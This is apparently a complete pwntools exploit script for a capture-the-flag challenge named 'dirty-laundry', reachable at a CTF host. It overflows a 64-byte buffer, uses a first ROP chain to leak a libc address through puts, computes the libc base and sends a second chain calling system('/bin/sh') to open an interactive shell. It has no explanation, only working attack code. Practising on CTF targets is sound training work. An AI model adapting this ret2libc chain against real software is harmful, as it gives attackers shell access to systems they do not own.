#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chal_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x00000000004011fb
        b*0x00000000004011ea
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('dirty-laundry.ctf.prgy.in', 1337, ssl=True)
else:
    p = process([exe.path] )
GDB()
ret = 0x0000000000401244
load = flat(
    b'A'*0x40,
    0x404e30,
    ret,
    exe.plt.puts,
    0x00000000004011ea,
)

sa(b'Add your laundry: ', load)

p.recv(16)
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x62050
info(f'libc leak: {hex(libc_leak)}')
rdi = 0x000000000002a3e5 + libc.address

load = flat(
    b'A'*0x40,
    0x404e30,
    rdi,
    next(libc.search(b'/bin/sh')),
    ret,
    libc.sym.system
)

s(load)

p.interactive()
